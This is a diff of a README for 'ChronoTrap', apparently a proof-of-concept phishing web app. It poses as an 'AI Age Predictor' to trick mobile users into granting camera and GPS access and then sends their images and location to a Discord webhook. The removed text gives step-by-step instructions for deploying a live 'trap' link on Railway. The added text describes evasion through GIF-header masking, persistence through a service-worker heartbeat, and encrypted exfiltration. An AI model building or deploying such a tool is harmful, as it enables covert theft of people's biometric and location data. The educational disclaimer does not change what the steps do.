@@ -1,43 +1,24 @@
-ChronoTrap: A Biometric & Geolocation Exfiltration PoC
+🚀 ChronoTrap C2: Render Deployment Edition
+Project Overview: > A high-fidelity Proof-of-Concept (PoC) demonstrating the dangers of Social Engineering and Permission Over-privileging on modern mobile OS (iOS/Android).
 
-"A Cybersecurity PoC demonstrating browser-based social engineering and permission chaining via deceptive UI/UX to exfiltrate biometric and geolocation data."
+The Pretext: > An "AI Age Predictor" that lures users into granting Camera and GPS access.
 
-Frontend: HTML5 MediaDevices & Geolocation API.
+Technical Features:
 
-Backend: Node.js/Express running on Railway.
+Encryption: Full AES-256-GCM authenticated encryption for all exfiltrated biometric data.
 
-Exfiltration: Data tunneled to Discord via Webhooks.
+Evasion: Payload masking using a GIF-header injection to bypass basic network inspection.
 
-educational research only
+Persistence: Background Service Worker (PWA) heartbeat to maintain a connection even if the browser tab is minimized.
 
+Infrastructure: Cloud-native Node.js backend deployed on Render with automated SSL termination.
 
-🛤️ Deploying to Railway
-This project is optimized for deployment on Railway. Follow these steps to get your own instance running in minutes.
+C2 Integration: Real-time data exfiltration via secure Discord Webhooks.
 
-1. Fork this Repository
-Click the Fork button at the top right of this page to create a copy of this project under your own GitHub account.
+🛡️ Why it's on Render
+Automatic HTTPS: Ensures the "Handshake" works by providing a trusted SSL certificate (required for Camera/GPS access).
 
-2. Connect to Railway
-Log in to the Railway Dashboard.
+Persistent Logs: Allows us to monitor the exfiltration "tunnel" live during the seminar.
 
-Click + New Project > Deploy from GitHub repo.
-
-Select your forked ChronoTrap repository.
-
-3. Configure Environment Variables
-Railway needs to know where to send the exfiltrated data. You must set these before the app will work correctly.
-
-In your Railway project, go to the Variables tab.
-
-Add the following variable:
-
-Variable Name: DISCORD_WEBHOOK
-
-Value: Your private Discord Webhook URL.
-
-4. Networking & Public URL
-Go to the Settings tab of your Railway service.
-
-Under Networking, click Generate Domain.
-
-Railway will provide a link (e.g., https://chronotrap-production.up.railway.app). This is your live "trap" link.
+⚠️ Educational Disclaimer
+This project is built strictly for educational purposes. It is designed to show that hardware security (like Apple's sandbox) cannot protect a user who is tricked into granting permissions via Social Engineering.
